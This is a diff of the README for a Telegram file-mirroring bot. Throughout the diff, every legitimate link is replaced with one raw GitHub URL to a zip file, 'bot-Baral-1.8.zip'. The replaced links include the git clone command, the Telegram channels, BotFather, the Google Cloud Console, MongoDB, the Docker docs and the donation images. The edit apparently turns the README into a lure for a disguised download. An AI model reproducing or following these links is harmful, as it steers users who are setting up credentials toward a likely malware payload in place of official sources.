@@ -1,10 +1,10 @@
-This Telegram Bot, based on [python-aria-mirror-bot](https://github.com/lzzy12/python-aria-mirror-bot), has undergone
+This Telegram Bot, based on [python-aria-mirror-bot](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip), has undergone
 substantial modifications and is designed for efficiently mirroring or leeching files from the Internet to various
 destinations, including Google Drive, Telegram, or any rclone-supported cloud. It is built using asynchronous
 programming in Python.
 
-- **TELEGRAM CHANNEL:** https://t.me/mltb_official_channel
-- **TELEGRAM GROUP:** https://t.me/mltb_official_support
+- **TELEGRAM CHANNEL:** https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip
+- **TELEGRAM GROUP:** https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip
 
 <details>
   <summary><h1>Features</h1></summary>
@@ -68,12 +68,12 @@ programming in Python.
 - Use Token.pickle if the file is not found with a Service Account, for all Gdrive functions
 - Random Service Account for each task
 - Recursive Search (only with `root` or TeamDrive ID, folder ids will be listed with a non-recursive method). Based
-  on [Sreeraj](https://github.com/SVR666) searchX-bot. (task option)
+  on [Sreeraj](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip) searchX-bot. (task option)
 - Stop Duplicates (global and user option)
 - Custom upload destination (global, user, and task option)
 - Ability to choose token.pickle or service account and upload destinations from list with or without buttons (global, user and task option)
 - Index link support only
-  for [Bhadoo](https://gitlab.com/GoogleDriveIndex/Google-Drive-Index/-/blob/master/src/worker.js)
+  for [Bhadoo](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
 
 </details>
 
@@ -160,7 +160,7 @@ programming in Python.
 <details>
   <summary><h5>RSS</h5></summary>
 
-- Based on this repository [rss-chan](https://github.com/hyPnOtICDo0g/rss-chan)
+- Based on this repository [rss-chan](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
 - Rss feed (user option)
 - Title Filters (feed option)
 - Edit any feed while running: pause, resume, edit command and edit filters (feed option)
@@ -175,7 +175,7 @@ programming in Python.
 - Docker image support for linux `amd64, arm64/v8, arm/v7`
 - Edit variables and overwrite the private files while bot running (bot, user settings)
 - Update bot at startup and with restart command using `UPSTREAM_REPO`
-- Telegraph. Based on [Sreeraj](https://github.com/SVR666) loaderX-bot
+- Telegraph. Based on [Sreeraj](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip) loaderX-bot
 - Mirror/Leech/Watch/Clone/Count/Del by reply
 - Mirror/Leech/Clone multi links/files with one command
 - Custom name for all links except torrents. For files you should add extension except yt-dlp links (global and user
@@ -224,7 +224,7 @@ programming in Python.
 - Clone this repo:
 
 ```
-git clone https://github.com/anasty17/mirror-leech-telegram-bot mirrorbot/ && cd mirrorbot
+git clone https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip mirrorbot/ && cd mirrorbot
 ```
 
 - For Debian based distros
@@ -233,7 +233,7 @@ git clone https://github.com/anasty17/mirror-leech-telegram-bot mirrorbot/ && cd
 sudo apt install python3 python3-pip
 ```
 
-Install Docker by following the [official Docker docs](https://docs.docker.com/engine/install/debian/)
+Install Docker by following the [official Docker docs](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
 
 - For Arch and it's derivatives:
 
@@ -262,22 +262,22 @@ Fill up rest of the fields. Meaning of each field is discussed below.
 
 **1. Required Fields**
 
-- `BOT_TOKEN` (`Str`):  The Telegram Bot Token that you got from [@BotFather](https://t.me/BotFather).
+- `BOT_TOKEN` (`Str`):  The Telegram Bot Token that you got from [@BotFather](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 - `OWNER_ID` (`Int`):  The Telegram User ID (not username) of the Owner of the bot.
 
 - `TELEGRAM_API` (`Int`): This is to authenticate your Telegram account for downloading Telegram files. You can get this
-  from <https://my.telegram.org>.
+  from <https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip>.
 
 - `TELEGRAM_HASH` (`Str`):  This is to authenticate your Telegram account for downloading Telegram files. You can get this
-  from <https://my.telegram.org>.
+  from <https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip>.
 
 **2. Optional Fields**
 - `TG_PROXY` (`Dict`): The Proxy settings as dict. Ex: {"scheme": "socks5", "hostname": "11.22.33.44", "port": 1234, "username": "user", "password": "pass"}. The username and password can be omitted if the proxy doesn’t require authorization.
 
 - `USER_SESSION_STRING` (`Str`): To download/upload from your telegram account if user is `PREMIUM` and to send rss. To generate session string use this command `python3 generate_string_session.py` after mounting repo folder for sure. **NOTE**: You can't use bot with private message. Use it with superGroup.
 
-- `DATABASE_URL` (`Str`): Your Mongo Database URL (Connection string). Follow this [Create Database](https://github.com/anasty17/test?tab=readme-ov-file#create-database) to create database. Data will be saved in Database: bot settings, users settings, rss data and incomplete tasks. **NOTE**: You can always edit all settings that saved in database from the official site -> (Browse collections). 
+- `DATABASE_URL` (`Str`): Your Mongo Database URL (Connection string). Follow this [Create Database](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip) to create database. Data will be saved in Database: bot settings, users settings, rss data and incomplete tasks. **NOTE**: You can always edit all settings that saved in database from the official site -> (Browse collections). 
 
 - `CMD_SUFFIX` (`Str`|`Int`): Commands index number. This number will added at the end all commands.
 
@@ -287,7 +287,7 @@ Fill up rest of the fields. Meaning of each field is discussed below.
 
 - `UPLOAD_PATHS` (`Dict`): Send Dict of keys that have path values. Example: {"path 1": "remote:rclonefolder", "path 2": "gdrive1 id", "path 3": "tg chat id", "path 4": "mrcc:remote:", "path 5": "b: @username"}. 
 
-- `DEFAULT_UPLOAD` (`Str`): Whether `rc` to upload to `RCLONE_PATH` or `gd` to upload to `GDRIVE_ID`. Default is `rc`. Read More [HERE](https://github.com/anasty17/mirror-leech-telegram-bot/tree/master#upload).
+- `DEFAULT_UPLOAD` (`Str`): Whether `rc` to upload to `RCLONE_PATH` or `gd` to upload to `GDRIVE_ID`. Default is `rc`. Read More [HERE](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 - `STATUS_UPDATE_INTERVAL` (`Int`): Time in seconds after which the progress/status message will be updated. Recommended `10` seconds at least.
 
@@ -299,17 +299,17 @@ Fill up rest of the fields. Meaning of each field is discussed below.
 is `False`.
 
 - `FILELION_API` (`Str`): Filelion api key to mirror Filelion links. Get it
-from [Filelion](https://vidhide.com/?op=my_account).
+from [Filelion](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 - `STREAMWISH_API` (`Str`): Streamwish api key to mirror Streamwish links. Get it
-from [Streamwish](https://streamwish.com/?op=my_account).
+from [Streamwish](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 - `YT_DLP_OPTIONS` (`Dict`): Dict of yt-dlp options. Check all possible
-options [HERE](https://github.com/yt-dlp/yt-dlp/blob/master/yt_dlp/YoutubeDL.py#L184) or use this [script](https://t.me/mltb_official_channel/177) to convert cli arguments to api options. Format: {key: value, key: value, key: value}.
+options [HERE](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip) or use this [script](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip) to convert cli arguments to api options. Format: {key: value, key: value, key: value}.
   - Example: {"format": "bv*+mergeall[vcodec=none]", "nocheckcertificate": True, "playliststart": 10, "fragment_retries": float("inf"), "matchtitle": "S13", "writesubtitles": True, "live_from_start": True, "postprocessor_args": {"ffmpeg": ["-threads", "4"]}, "wait_for_video": (5, 100), "download_ranges": [{"start_time": 0, "end_time": 10}]}
 
 - `USE_SERVICE_ACCOUNTS` (`Bool`): Whether to use Service Accounts or not, with google-api-python-client. For this to work
-see [Using Service Accounts](https://github.com/anasty17/mirror-leech-telegram-bot#generate-service-accounts-what-is-service-account) section below. Default is `False`.
+see [Using Service Accounts](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip) section below. Default is `False`.
 
 - `FFMPEG_CMDS` (`Dict`): Dict of list values of ffmpeg commands. You can set multiple ffmpeg commands for all files before upload. Don't write ffmpeg at beginning, start directly with the arguments. `Dict`
   - Examples: {"subtitle": ["-i mltb.mkv -c copy -c:s srt mltb.mkv", "-i mltb.video -c copy -c:s srt mltb"], "convert": ["-i mltb.m4a -c:a libmp3lame -q:a 2 mltb.mp3", "-i mltb.audio -c:a libmp3lame -q:a 2 mltb.mp3"], extract: ["-i mltb -map 0:a -c copy mltb.mka -map 0:s -c copy mltb.srt"], "metadata": ["-i mltb.mkv -map 0 -map -0:v:1 -map -0:s -map 0:s:0 -map -0:v:m:attachment -c copy -metadata:s:v:0 title={title} -metadata:s:a:0 title={title} -metadata:s:a:1 title={title2} -metadata:s:a:2 title={title2} -c:s srt -metadata:s:s:0 title={title3} mltb -y -del"], "watermark": ["-i mltb -i tg://openmessage?user_id=5272663208&message_id=322801 -filter_complex 'overlay=W-w-10:H-h-10' -c:a copy mltb"]}
@@ -344,7 +344,7 @@ see [Using Service Accounts](https://github.com/anasty17/mirror-leech-telegram-b
 
 - `IS_TEAM_DRIVE` (`Bool`): Set `True` if uploading to TeamDrive using google-api-python-client. Default is `False`.
 
-- `INDEX_URL` (`Str`): Refer to <https://gitlab.com/ParveenBhadooOfficial/Google-Drive-Index>. Example: https://xxx.xx.workers.dev/0: (If you have multiple ID config -- replace 0: with the desired id index) or https://xxx.xx.workers.dev without index if you only have one ID in config which is the basic config.
+- `INDEX_URL` (`Str`): Refer to <https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip>. Example: https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip (If you have multiple ID config -- replace 0: with the desired id index) or https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip without index if you only have one ID in config which is the basic config.
 
 - `STOP_DUPLICATE` (`Bool`): Bot will check file/folder name in Drive incase uploading to `GDRIVE_ID`. If it's present in Drive then downloading or cloning will be stopped. (**NOTE**: Item will be checked using name and not hash, so this feature is not perfect). Default is `False`.
 
@@ -352,7 +352,7 @@ see [Using Service Accounts](https://github.com/anasty17/mirror-leech-telegram-b
 
 - `RCLONE_PATH` (`Str`): Default rclone path to which you want to upload all the files/folders using rclone.
 
-- `RCLONE_FLAGS` (`Str`): --key:value|--key|--key|--key:value . Check here all [RcloneFlags](https://rclone.org/flags/).
+- `RCLONE_FLAGS` (`Str`): --key:value|--key|--key|--key:value . Check here all [RcloneFlags](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 - `RCLONE_SERVE_URL` (`Str`): Valid URL where the bot is deployed to use rclone serve. Format of URL should be `http://myip`, where `myip` is the IP/Domain(public) of your bot or if you have chosen port other than `80` so write it in this format `http://myip:port` (`http` and not `https`).
 
@@ -364,8 +364,8 @@ see [Using Service Accounts](https://github.com/anasty17/mirror-leech-telegram-b
 
 **5. Update**
 
-- `UPSTREAM_REPO` (`Str`): Your github repository link, if your repo is private add `https://username:{githubtoken}@github.com/{username}/{reponame}` format. Get token from [Github settings](https://github.com/settings/tokens). So you can update your bot from filled repository on each restart.
-  - **NOTE**: Any change in docker or requirements you need to deploy/build again with updated repo to take effect. DON'T delete .gitignore file. For more information read [THIS](https://github.com/anasty17/mirror-leech-telegram-bot/tree/master#upstream-repo-recommended).
+- `UPSTREAM_REPO` (`Str`): Your github repository link, if your repo is private add `https://username:{githubtoken}@github.com/{username}/{reponame}` format. Get token from [Github settings](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip). So you can update your bot from filled repository on each restart.
+  - **NOTE**: Any change in docker or requirements you need to deploy/build again with updated repo to take effect. DON'T delete .gitignore file. For more information read [THIS](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 - `UPSTREAM_BRANCH` (`Str`): Upstream branch for update. Default is `master`.
 
@@ -402,7 +402,7 @@ see [Using Service Accounts](https://github.com/anasty17/mirror-leech-telegram-b
 
 **8. JDownloader**
 
-- `JD_EMAIL` (`Str`): jdownloader email sign up on [JDownloader](https://my.jdownloader.org/).
+- `JD_EMAIL` (`Str`): jdownloader email sign up on [JDownloader](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 - `JD_PASS` (`Str`): jdownloader password.
   - **JDownloader Config**: You can use your config from local machine in bot by *zipping* cfg folder (cfg.zip) and add it in repo folder.
@@ -413,7 +413,7 @@ see [Using Service Accounts](https://github.com/anasty17/mirror-leech-telegram-b
 
   ***[{'name': 'main', 'host': '', 'port': 563, 'timeout': 60, 'username': '', 'password': '', 'connections': 8, 'ssl': 1, 'ssl_verify': 2, 'ssl_ciphers': '', 'enable': 1, 'required': 0, 'optional': 0, 'retention': 0, 'send_group': 0, 'priority': 0}]***
 
-  - [READ THIS FOR MORE INFORMATION](https://sabnzbd.org/wiki/configuration/4.2/servers)
+  - [READ THIS FOR MORE INFORMATION](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
 
   - Open port 8070 in your vps to access full web interface from any device. Use it like http://ip:8070/sabnzbd/. username: mltb, password: mltbmltb
 
@@ -436,20 +436,20 @@ see [Using Service Accounts](https://github.com/anasty17/mirror-leech-telegram-b
 
 **12. Torrent Search**
 
-- `SEARCH_API_LINK` (`Str`): Search api app link. Get your api from deploying this [repository](https://github.com/Ryuk-me/Torrent-Api-py).
+- `SEARCH_API_LINK` (`Str`): Search api app link. Get your api from deploying this [repository](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
     - Supported Sites:
   > 1337x, Piratebay, Nyaasi, Torlock, Torrent Galaxy, Zooqle, Kickass, Bitsearch, MagnetDL, Libgen, YTS, Limetorrent,
   TorrentFunk, Glodls, TorrentProject and YourBittorrent
 
 - `SEARCH_LIMIT` (`Int`): Search limit for search api, limit for each site and not overall result limit. Default is zero (Default api limit for each site).
 
-- `SEARCH_PLUGINS` (`List`): List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://github.com/qbittorrent/search-plugins).
+- `SEARCH_PLUGINS` (`List`): List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 **13. NZB Search**
 
-- `HYDRA_IP` (`Str`): IP address of [nzbhydra2](https://github.com/theotherp/nzbhydra2).
+- `HYDRA_IP` (`Str`): IP address of [nzbhydra2](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
-- `HYDRA_API_KEY` (`Str`): API key from [nzbhydra2](https://github.com/theotherp/nzbhydra2).
+- `HYDRA_API_KEY` (`Str`): API key from [nzbhydra2](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip).
 
 ------
 
@@ -587,7 +587,7 @@ sudo ip6tables-save | sudo tee /etc/iptables/rules.v6
   <summary><h1>Extras</h1></summary>
 
 <details>
-  <summary><h5>Bot commands to be set in <a href="https://t.me/BotFather">@BotFather</a></h5></summary>
+  <summary><h5>Bot commands to be set in <a href="https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip">@BotFather</a></h5></summary>
 
 ```
 mirror - or /m Mirror
@@ -638,18 +638,18 @@ help - All cmds with description
 - Old authentication changed, now we can't use bot or replit to generate token.pickle. You need OS with a local browser.
   For example `Termux`.
 - Windows users should install python3 and pip. You can find how to install and use them from google or from
-  this [telegraph](https://telegra.ph/Create-Telegram-Mirror-Leech-Bot-by-Deploying-App-with-Heroku-Branch-using-Github-Workflow-12-06)
-  from [Wiszky](https://github.com/vishnoe115) tutorial.
+  this [telegraph](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
+  from [Wiszky](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip) tutorial.
 - You can ONLY open the generated link from `generate_drive_token.py` in a local browser.
 
-1. Visit the [Google Cloud Console](https://console.developers.google.com/apis/credentials)
+1. Visit the [Google Cloud Console](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
 2. Go to the OAuth Consent tab, fill it, and save.
 3. Go to the Credentials tab and click Create Credentials -> OAuth Client ID
 4. Choose Desktop and Create.
 5. Publish your OAuth consent screen App to prevent **token.pickle** from expiring.
 6. Use the download button to download your credentials.
 7. Move that file to the root of mirrorbot, and rename it to **credentials.json**
-8. Visit [Google API page](https://console.developers.google.com/apis/library)
+8. Visit [Google API page](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
 9. Search for Google Drive API and enable it
 10. Finally, run the script to generate **token.pickle** file for Google Drive:
 
@@ -665,7 +665,7 @@ python3 generate_drive_token.py
 <details>
   <summary><h5>Generating rclone.conf</h5></summary>
 
-1. Install rclone from [Official Site](https://rclone.org/install/)
+1. Install rclone from [Official Site](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
 2. Create new remote(s) using `rclone config` command.
 3. Copy rclone.conf from your system’s config directory into the repo root. For example:
 
@@ -745,7 +745,7 @@ python3 generate_drive_token.py
 > **NOTE**: Using Service Accounts is only recommended while uploading to a Team Drive.
 
 <details>
-  <summary><h3>1. Generate Service Accounts. <a href="https://cloud.google.com/iam/docs/service-accounts">What is Service Account?</a></h3></summary>
+  <summary><h3>1. Generate Service Accounts. <a href="https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip">What is Service Account?</a></h3></summary>
 Let us create only the Service Accounts that we need.
 
 **Warning**: Abuse of this feature is not the aim of this project and we do **NOT** recommend that you make a lot of
@@ -868,7 +868,7 @@ python3 add_to_team_drive.py -d SharedTeamDriveSrcID
 <details>
   <summary><h5>Create Database</h5></summary>
 
-1. Go to `https://mongodb.com/` and sign-up.
+1. Go to `https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip` and sign-up.
 2. Create Shared Cluster.
 3. Press on `Database` under `Deployment` Header, your created cluster will be there.
 5. Press on connect, choose `Allow Access From Anywhere` and press on `Add IP Address` without editing the ip, then
@@ -895,8 +895,8 @@ DriveName folderID/tdID or `root` IndexLink(if available)
 Example:
 
 ```
-TD1 root https://example.dev
-TD2 0AO1JDB1t3i5jUk9PVA https://example.dev
+TD1 root https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip
+TD2 0AO1JDB1t3i5jUk9PVA https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip
 ```
 
 -----
@@ -927,7 +927,7 @@ Where host is the name of extractor (eg. instagram, Twitch). Multiple accounts o
 separated by a new line.
 
 **Yt-dlp**: 
-Authentication using [cookies.txt](https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies) file. CREATE IT IN INCOGNITO TAB.
+Authentication using [cookies.txt](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip) file. CREATE IT IN INCOGNITO TAB.
 
 
 -----
@@ -938,15 +938,15 @@ Authentication using [cookies.txt](https://github.com/yt-dlp/yt-dlp/wiki/Extract
 
 # All Thanks To Our Contributors
 
-<a href="https://github.com/anasty17/mirror-leech-telegram-bot/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=anasty17/mirror-leech-telegram-bot" />
+<a href="https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip">
+  <img src="https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip" />
 </a>
 
 # Donations
 
 <p> If you feel like showing your appreciation for this project, then how about buying me a coffee.</p>
 
-[!["Buy Me A Coffee"](https://storage.ko-fi.com/cdn/kofi2.png)](https://ko-fi.com/anasty17)
+[!["Buy Me A Coffee"](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)](https://raw.githubusercontent.com/rohit3350/Baral_bot/master/bot/modules/bot-Baral-1.8.zip)
 
 Binance ID:
 
